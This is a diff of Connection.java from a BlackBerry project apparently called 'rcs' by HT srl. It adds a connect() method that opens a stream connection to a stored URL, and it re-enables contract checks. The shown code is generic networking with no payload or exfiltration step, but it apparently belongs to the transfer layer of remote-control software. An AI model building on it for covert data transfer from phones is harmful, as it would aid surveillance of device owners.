@@ -1,3 +1,4 @@
+
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -5,12 +6,14 @@
  * File         : Connection.java 
  * Created      : 26-mar-2010
  * *************************************************/
+
 package com.ht.rcs.blackberry.transfer;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 
+import javax.microedition.io.Connector;
 import javax.microedition.io.StreamConnection;
 
 import com.ht.rcs.blackberry.utils.Check;
@@ -18,16 +21,18 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public abstract class Connection {
-	//#debug
+    //#debug
     protected static Debug debug = new Debug("Connection", DebugLevel.VERBOSE);
 
     protected DataInputStream in;
     protected DataOutputStream out;
-    protected StreamConnection connection = null;
+    protected StreamConnection connection;
 
-    protected boolean connected = false;
+    protected boolean connected;
 
-    public abstract boolean connect();
+    protected String url;
+
+    //public abstract boolean connect();
 
     public synchronized void disconnect() {
         if (connected) {
@@ -73,7 +78,7 @@ public abstract class Connection {
     public synchronized byte[] receive(int length) throws IOException {
         if (connected) {
             // #ifdef DBC
-//@            Check.requires(in != null, "null in_");
+                        Check.requires(in != null, "null in_");
             // #endif
 
             // Create an input array just big enough to hold the data
@@ -90,6 +95,39 @@ public abstract class Connection {
         }
     }
 
+    public synchronized final boolean connect() {
+
+        // #ifdef DBC
+                            Check.ensures(url != null, "url null");
+        // #endif
+
+        try {
+            //#debug
+            debug.trace("url: " + url);
+            connection = (StreamConnection) Connector.open(url);
+            in = connection.openDataInputStream();
+            out = connection.openDataOutputStream();
+
+            if (in != null && out != null) {
+                connected = true;
+                // #ifdef DBC
+                                    Check.ensures(connection != null, "connection_ null");
+                                    Check.ensures(in != null, "in_ null");
+                                    Check.ensures(out != null, "out_ null");
+                // #endif
+            }
+
+        } catch (IOException e) {
+            //#debug
+            debug.error("cannot connect: " + e);
+            connected = false;
+        }
+
+        //#debug
+        debug.trace("cannot connected: " + connected);
+        return connected;
+    }
+
     /**
      * Pass some data to the server and wait for a response.
      * 
@@ -101,7 +139,7 @@ public abstract class Connection {
 
         if (connected) {
             // #ifdef DBC
-//@            Check.requires(out != null, "null out_");
+                        Check.requires(out != null, "null out_");
             // #endif
 
             int length = data.length;
